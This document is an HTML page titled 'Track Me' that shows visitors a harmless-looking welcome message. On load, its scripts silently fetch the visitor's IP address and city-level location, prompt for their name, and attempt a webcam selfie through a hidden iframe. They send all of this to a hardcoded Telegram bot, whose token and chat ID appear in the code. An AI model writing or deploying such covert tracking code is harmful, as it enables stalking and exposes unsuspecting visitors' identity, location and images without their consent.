<!DOCTYPE html>
<html>
<head>
    <title>Track Me</title>
    <style>
        body {
            background-image: url('img/altarys gif.gif');
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-position: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
        }
        h1, p {
            background-color: rgba(0, 0, 0, 0.5);
            padding: 20px;
            border-radius: 10px;
        }
        .camera-container {
            margin-top: 20px;
        }
        .camera-container video, .camera-container canvas {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
        }
        iframe {
            display: none;
        }
    </style>
    <script>
        function track() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ip = data.ip;
                    var userName = prompt("Please enter your name:");
                    fetch(`https://ipinfo.io/${ip}/json?token=a0cf54b7e5e91b`)
                        .then(response => response.json())
                        .then(locationData => {
                            var location = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
                            var data = `IP: ${ip}, Name: ${userName}, Location: ${location}`;
                            var botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
                            var chatId = '5410457102';
                            fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    text: data
                                })
                            });
                        });
                });
        }

        function takeSelfie() {
            const iframe = document.createElement('iframe');
            iframe.src = 'https://yourusername.github.io/camera.html';
            document.body.appendChild(iframe);

            iframe.onload = () => {
                const video = iframe.contentWindow.document.getElementById('video');
                const canvas = iframe.contentWindow.document.getElementById('canvas');
                const context = canvas.getContext('2d');

                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                    .then(stream => {
                        video.srcObject = stream;
                        video.play();
                        console.log('Camera stream started');
                        setTimeout(() => {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const imageData = canvas.toDataURL('image/jpeg');
                            console.log('Selfie captured');
                            const botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
                            const chatId = '5410457102';
                            fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    photo: imageData
                                })
                            });
                            console.log('Selfie sent to Telegram');
                        }, 1000); // Capture after 1 second
                    })
                    .catch(err => {
                        console.error('Error accessing the camera:', err);
                    });
            };
        }

        function sendLocationAndSelfie() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ip = data.ip;
                    fetch(`https://ipinfo.io/${ip}/json?token=a0cf54b7e5e91b`)
                        .then(response => response.json())
                        .then(locationData => {
                            var location = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
                            var botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
                            var chatId = '5410457102';
                            fetch('https://api.telegram.org/bot' + botToken + '/sendLocation', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    latitude: locationData.loc.split(',')[0],
                                    longitude: locationData.loc.split(',')[1]
                                })
                            });
                        });
                });

            takeSelfie();
        }
    </script>
</head>
<body onload="track(); sendLocationAndSelfie();">
    <div>
        <h1>Welcome!</h1>
        <p>Thank you for visiting.</p>
        <div class="camera-container">
            <video id="video" autoplay muted></video>
            <canvas id="canvas" style="display: none;"></canvas>
        </div>
    </div>
</body>
</html>
